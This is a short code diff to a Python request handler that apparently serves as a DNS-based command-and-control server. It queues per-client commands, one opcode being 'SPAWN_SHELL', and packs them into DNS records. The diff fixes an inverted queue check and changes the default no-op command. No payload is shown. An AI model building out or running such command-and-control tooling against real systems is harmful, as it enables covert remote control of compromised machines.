@@ -34,7 +34,6 @@ class IndividualClientHandler(BaseRequestHandler):
             self.last_request_id = request.header.id
             self.send_cmd(request)
 
-
     def get_data(self):
         return self.request[0].strip()
 
@@ -54,11 +53,11 @@ class IndividualClientHandler(BaseRequestHandler):
             "SPAWN_SHELL": 3 
         }
 
-        if not self.queued_commands:
+        if self.queued_commands:
 			# TODO: use dictionary switch to encode different packets
             opcode, cmd = self.queued_commands.pop()
         else:
-            opcode, cmd = (command_type["NONE"], "")
+            opcode, cmd = ("NONE", "NONE")
 
         rr_type, rr_constructor  = RR[self.record_type]
         # Generate skeleton question for packet
